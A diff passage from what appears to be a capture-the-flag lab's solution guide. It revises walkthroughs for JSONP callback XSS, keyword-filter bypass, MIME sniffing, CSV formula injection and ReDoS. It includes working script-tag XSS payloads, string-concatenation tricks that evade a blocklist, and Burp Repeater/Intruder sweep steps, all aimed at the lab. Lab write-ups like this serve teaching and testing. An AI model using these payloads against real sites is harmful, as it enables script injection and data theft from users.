+   The body is `alert(1)//({"user":"alice","role":"user","pxa":"...","pxk":"..."});` served as
+   `application/javascript`. That proves execution, but earns no flag on its own: there is no
+   `X-Flag` header on this response anymore.
+2. Claim the flag with a payload that beacons the per-session token. The response data carries
+   the token only as two share fields, `pxa` and `pxk`; your code must combine them at runtime
+   (XOR the hex pairs) and echo the rebuilt token to `/jsonp/beacon-xss`. Define a small
+   `combineHex(a,b)` helper on a page you control (it XORs the two hex strings pair by pair),
+   then load the feed as a script from that page:
+   ```
+   <script src="/jsonp/user?callback=(d=>fetch('/jsonp/beacon-xss?v=callback-xss&n='+combineHex(d.pxa,d.pxk)))//"></script>
+   ```
+   The parenthesized arrow function is called with the data object, reads the shares, and fires
+   the beacon; the beacon response carries the flag.
 
 Why it works: the callback name is reflected into executable JavaScript with
-no validation, so it breaks out of the function-call context.
+no validation, so it breaks out of the function-call context. Only a beacon
+carrying the rebuilt token counts, because it proves the injected script
+really executed with the response data.
 
-**Burp workflow:** With your browser proxied through Burp, browse to /jsonp/user?callback=hello and watch the request land in Proxy history. Right click it and send it to Repeater (Ctrl+R). In Repeater, change the callback parameter value to break out of the function call wrapper, then confirm the response body reflects your tampering and is served as application/javascript. Load the tampered Repeater URL in Burp's browser so the injected script runs, and have it echo the per-session token to /jsonp/beacon-xss?v=callback-xss with your token value to collect the flag.
+**Burp workflow:** With your browser proxied through Burp, browse to /jsonp/user?callback=hello and watch the request land in Proxy history. Right click it and send it to Repeater (Ctrl+R). In Repeater, change the callback parameter value to break out of the function call wrapper, then confirm the response body reflects your tampering and is served as application/javascript. Load the tampered URL as a script on a page you control (with the `combineHex` helper defined) so the injected script runs, combines the `pxa`/`pxk` shares from the data, and beacons the rebuilt token to /jsonp/beacon-xss?v=callback-xss: the beacon response shows the flag.
 
 
 **2. JSONP Data Theft** – `PENTRIX{...}`
@@ -3130,15 +3182,25 @@ site that can get the victim to load a script tag.
 **3. Callback Filter Bypass** – `PENTRIX{...}`
 
 1. `callback=alert(1)` is rejected with 400 (the word "alert" is blocked).
-2. Rebuild it at runtime (URL-encoded):
-   `curl -i "http://<your-lab-address>/jsonp/filtered?callback=x%3Btop%5B%27al%27%2B%27ert%27%5D%281%29%3B%2F%2F"`
-   which decodes to `x;top['al'+'ert'](1);//`. The response executes it and
-   the `X-Flag` header carries the flag.
+2. Rebuild what you need at runtime and beacon the token in the same payload. The
+   response data carries the per-session token only as `pxa`/`pxk` shares, so (with the
+   same `combineHex(a,b)` helper defined on your page, XORing the hex pairs) load:
+   ```
+   <script src="/jsonp/filtered?callback=(d=>top['fe'+'tch']('/jsonp/beacon-xss?v=filter-bypass&n='+combineHex(d.pxa,d.pxk)))//"></script>
+   ```
+   URL-encoded in a raw request, the callback decodes to
+   `(d=>top['fe'+'tch']('/jsonp/beacon-xss?v=filter-bypass&n='+combineHex(d.pxa,d.pxk)))//`.
+   The concatenation rebuilds `fetch` at runtime (the same trick rebuilds `alert`),
+   the arrow function receives the data object, and the beacon fires with the rebuilt
+   token. The beacon response carries the flag; the filtered feed response itself
+   carries no flag header.
 
 Why it works: the blocklist only bans the literal word "alert", but string
-concatenation rebuilds it at runtime where the filter never looks.
+concatenation rebuilds banned words at runtime where the filter never looks.
+The attempt shape is recorded when the callback is accepted, but only an
+executed beacon echoing the rebuilt token earns the flag.
 
-**Burp workflow:** With Proxy running, browse to /jsonp/filtered?callback=test and send the request to Repeater (Ctrl+R) to confirm the feed reflects the callback. Probe the blocklist: change callback to the banned word and watch Repeater return a 400, which tells you exactly which filter you are facing. Use Intruder (Ctrl+I) with a Grep-Match on the 400 status to sweep obfuscation variants quickly, or just rebuild the banned word at runtime with string concatenation in Repeater. Load the winning Repeater URL in the Burp browser so your runtime-built code executes, and beacon the token to collect the flag from the X-Flag header.
+**Burp workflow:** With Proxy running, browse to /jsonp/filtered?callback=test and send the request to Repeater (Ctrl+R) to confirm the feed reflects the callback. Probe the blocklist: change callback to the banned word and watch Repeater return a 400, which tells you exactly which filter you are facing. Rebuild the banned word at runtime with string concatenation in Repeater until the 200 comes back, then load the winning URL as a script on a page you control (with `combineHex` defined) so the payload executes and beacons the rebuilt token to /jsonp/beacon-xss?v=filter-bypass: the beacon response shows the flag.
 
 
 **4. Array Constructor Hijack** – `PENTRIX{...}`
@@ -3168,17 +3230,23 @@ feed intercepts every element (the classic 2007 hijack), including the `feed-tok
 
 **5. JSONP MIME Sniffing** – `PENTRIX{...}`
 
-1. `curl -i "http://<your-lab-address>/jsonp/snippet?callback=%3Cscript%3Ealert(1)%3C%2Fscript%3E"`
-2. The response is `Content-Type: text/html` with
-   `<script>alert(1)</script>({"note":"hello"});` in the body, and the
-   `X-Flag` header carries the flag.
+1. Probe: `curl -i "http://<your-lab-address>/jsonp/snippet?callback=%3Cscript%3Ealert(1)%3C%2Fscript%3E"`
+   The response is `Content-Type: text/html` with
+   `<script>alert(1)</script>({"note":"hello","pxa":"...","pxk":"..."});` in the body.
+   The `<` in the callback records the attempt, but earns no flag by itself, and
+   there is no `X-Flag` header on this response.
+2. Claim the flag: your injected markup must read the `pxa` and `pxk` share
+   fields out of the response text, combine them at runtime (XOR the hex
+   pairs) and beacon the rebuilt token to
+   `/jsonp/beacon-xss?v=mimetype&n=<token>`. The beacon response carries the
+   flag, and it only accepts the beacon after the HTML-shaped attempt above
+   was recorded in the same session.
 
 Why it works: JSONP served as `text/html` is parsed as a document, so HTML in
-the callback executes when the URL is visited directly or framed.
+the callback executes when the URL is visited directly or framed, and only an
+executed payload that echoes the token proves it.
 
-**Burp workflow:** Proxy your browser and open /jsonp/snippet?callback=hello, then inspect the response in Proxy history: note the Content-Type is text/html, so the browser parses it as a document, not as a script. Send the request to Repeater (Ctrl+R) and try HTML-shaped callback values, checking that the response body places your markup before the JSON. Paste the Repeater-crafted URL into Burp's browser so the injected markup executes, read the per-session token from the response text, and echo it to /jsonp/beacon-xss?v=mimetype with your token value to get the flag.
-
----
+**Burp workflow:** Proxy your browser and open /jsonp/snippet?callback=hello, then inspect the response in Proxy history: note the Content-Type is text/html, so the browser parses it as a document, not as a script. Send the request to Repeater (Ctrl+R) and try HTML-shaped callback values, checking that the response body places your markup before the JSON. Paste the Repeater-crafted URL into Burp's browser so the injected markup executes, have it read the `pxa`/`pxk` shares from the response text, combine them, and beacon the rebuilt token to /jsonp/beacon-xss?v=mimetype: the beacon response shows the flag.
 
 
 ## formula – CSV Formula Injection
@@ -3225,7 +3293,7 @@ then export. Awards `PENTRIX{...}`.
 Why it works: the pipe-prefixed cell is LibreOffice's formula trigger
 variant, and it reaches the export unsanitized like the rest.
 
-**Burp workflow:** Intercept the POST to /formula/add in the Proxy and send it to Repeater (Ctrl+R). Set the name value to a pipe-prefixed cell (the LibreOffice formula trigger variant) referencing a local executable, then send the request. Follow up with a GET to /formula/export.csv in Repeater and check the X-Flags header for the flag. This one is worth an Intruder run (Ctrl+I) if you want to sweep several pipe-prefixed trigger shapes against the name field to see which ones the export lets through. Summary: module formula (CSV Formula Injection), 4 challenges covered.
+**Burp workflow:** Intercept the POST to /formula/add in the Proxy and send it to Repeater (Ctrl+R). Set the name value to a pipe-prefixed cell (the LibreOffice formula trigger variant) referencing a local executable, then send the request. Follow up with a GET to /formula/export.csv in Repeater and check the X-Flags header for the flag. This one is worth an Intruder run (Ctrl+I) if you want to sweep several pipe-prefixed trigger shapes against the name field to see which ones the export lets through.
 
 ---
 
@@ -3277,5 +3345,5 @@ Why it works: the search query is interpolated as the repeated atom of the
 template's nested quantifiers, so matching the haystack's character gives the
 backtracking engine an exponential number of partitions to try.
 
-**Burp workflow:** Intercept the POST to /redos/search in Proxy and push it to Repeater with Ctrl+R. Your q value is compiled into the repeated atom of the server's nested-quantifier template, so set q to the same character the fixed haystack is made of (plain a) and the engine has to try every partition before the haystack's final character fails the match. Each Repeater send reports its response time, and when it crosses the one-second mark the flag is shown. - Module: redos (ReDoS) - Challenges: 4 (1. Catastrophic Email Regex, 2. Nested Quantifier Username, 3. Catastrophic URL Regex, 4. Regex Injection Search).
+**Burp workflow:** Intercept the POST to /redos/search in Proxy and push it to Repeater with Ctrl+R. Your q value is compiled into the repeated atom of the server's nested-quantifier template, so set q to the same character the fixed haystack is made of (plain a) and the engine has to try every partition before the haystack's final character fails the match. Each Repeater send reports its response time, and when it crosses the one-second mark the flag is shown.
 
